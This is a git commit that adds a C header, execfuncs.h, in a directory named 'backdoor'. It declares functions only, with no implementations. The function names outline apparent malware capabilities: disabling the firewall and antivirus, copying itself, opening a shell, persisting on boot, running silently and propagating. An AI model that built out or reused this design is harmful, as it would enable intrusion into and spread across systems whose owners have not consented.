d0c050717d2d724559af240eca780031fc3fc745
Roberto M. Jr <53888062+mrx6SO@users.noreply.github.com>
2019-10-05 13:24:08 -0300

    Create execfuncs.h

---
+++ backdoor/execfuncs.h
@@ -0,0 +1,25 @@
+#ifndef _EXECFUNCS_H
+#define _EXECFUNCS_H
+
+#include "main.h"
+
+
+/* functions */
+
+//void kill_av();
+int kill_frwl();
+int auto_copy();
+int shell();
+
+//void logged(const char * fmt, ...);
+//void cp_reg();
+//void init_on_boot();
+
+//void silent_mode();
+
+
+//void propagate();
+//int execute(char * commands);
+
+#endif // _EXECFUNCS_H
+
